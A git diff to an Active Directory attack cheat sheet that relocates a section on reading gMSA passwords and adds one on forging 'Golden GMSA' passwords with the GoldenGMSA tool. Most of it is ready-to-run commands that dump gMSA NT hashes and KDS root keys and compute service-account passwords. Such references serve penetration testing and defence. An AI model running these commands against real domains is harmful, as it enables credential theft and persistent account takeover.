@@ -48,6 +48,7 @@
     - [Password in AD User comment](#password-in-ad-user-comment)
     - [Reading LAPS Password](#reading-laps-password)
     - [Reading GMSA Password](#reading-gmsa-password)
+    - [Forging Golden GMSA](#forging-golden-gmsa)
     - [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
       - [Using Mimikatz](#using-mimikatz)
       - [Using Meterpreter](#using-meterpreter)
@@ -1389,40 +1390,7 @@ or dump the Active Directory and `grep` the content.
 ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
 ```
 
-### Reading GMSA Password
 
-> User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically changed.
-
-#### GMSA Attributes in the Active Directory 
-* `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`) - stores the security principals that can access the GMSA password.
-* `msds-ManagedPassword` - This attribute contains a BLOB with password information for group-managed service accounts.
-* `msDS-ManagedPasswordId` - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
-* `msDS-ManagedPasswordInterval` - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.
-
-
-#### Extract NT hash from the Active Directory
-
-* [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) (C#)
-  ```ps1
-  # https://github.com/rvazarkar/GMSAPasswordReader
-  GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
-  ```
-
-* [gMSADumper (Python)](https://github.com/micahvandeusen/gMSADumper)
-   ```powershell
-  # https://github.com/micahvandeusen/gMSADumper
-  python3 gMSADumper.py -u User -p Password1 -d domain.local
-  ```
-  
-* Active Directory Powershell
-  ```ps1
-  $gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
-  $blob = $gmsa.'msDS-ManagedPassword'
-  $mp = ConvertFrom-ADManagedPasswordBlob $blob
-  $hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
-  ```
-
-* [gMSA_Permissions_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1) based on Active Directory PowerShell module
 
 ### Reading LAPS Password
 
@@ -1470,7 +1438,7 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
        foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
        ```
 
- - From linux:
+ - From Linux:
 
    * [pyLAPS](https://github.com/p0dalirius/pyLAPS) to **read** and **write** LAPS passwords:
        ```bash
@@ -1496,6 +1464,68 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
       ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
       ```
      
+
+### Reading GMSA Password
+
+> User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.
+
+#### GMSA Attributes in the Active Directory 
+* `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`) - stores the security principals that can access the GMSA password.
+* `msds-ManagedPassword` - This attribute contains a BLOB with password information for group-managed service accounts.
+* `msDS-ManagedPasswordId` - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
+* `msDS-ManagedPasswordInterval` - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.
+
+
+#### Extract NT hash from the Active Directory
+
+* [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) (C#)
+  ```ps1
+  # https://github.com/rvazarkar/GMSAPasswordReader
+  GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
+  ```
+
+* [gMSADumper (Python)](https://github.com/micahvandeusen/gMSADumper)
+   ```powershell
+  # https://github.com/micahvandeusen/gMSADumper
+  python3 gMSADumper.py -u User -p Password1 -d domain.local
+  ```
+  
+* Active Directory Powershell
+  ```ps1
+  $gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
+  $blob = $gmsa.'msDS-ManagedPassword'
+  $mp = ConvertFrom-ADManagedPasswordBlob $blob
+  $hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
+  ```
+
+* [gMSA_Permissions_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1) based on Active Directory PowerShell module
+
+
+### Forging Golden GMSA
+
+> One notable difference between a **Golden Ticket** attack and the **Golden GMSA** attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.
+
+* Using [GoldenGMSA](https://github.com/Semperis/GoldenGMSA)
+    ```ps1
+    # Enumerate all gMSAs
+    GoldenGMSA.exe gmsainfo
+    # Query for a specific gMSA
+    GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112
+
+    # Dump all KDS Root Keys
+    GoldenGMSA.exe kdsinfo
+    # Dump a specific KDS Root Key
+    GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
+
+    # Compute gMSA password
+    # --sid <gMSA SID>: SID of the gMSA (required)
+    # --kdskey <Base64-encoded blob>: Base64 encoded KDS Root Key
+    # --pwdid <Base64-encoded blob>: Base64 of msds-ManagedPasswordID attribute value
+    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires privileged access to the domain
+    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # requires LDAP access
+    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # Offline mode
+    ```
+
 ### Pass-the-Ticket Golden Tickets
 
 Forging a TGT require the `krbtgt` NTLM hash
@@ -3555,3 +3585,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
 * [AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022](https://www.blackarrow.net/adcs-weaponizing-esc7-attack/)
 * [AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh](https://www.blackarrow.net/ad-cs-from-manageca-to-rce/)
+* [Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022](https://www.semperis.com/blog/golden-gmsa-attack/)
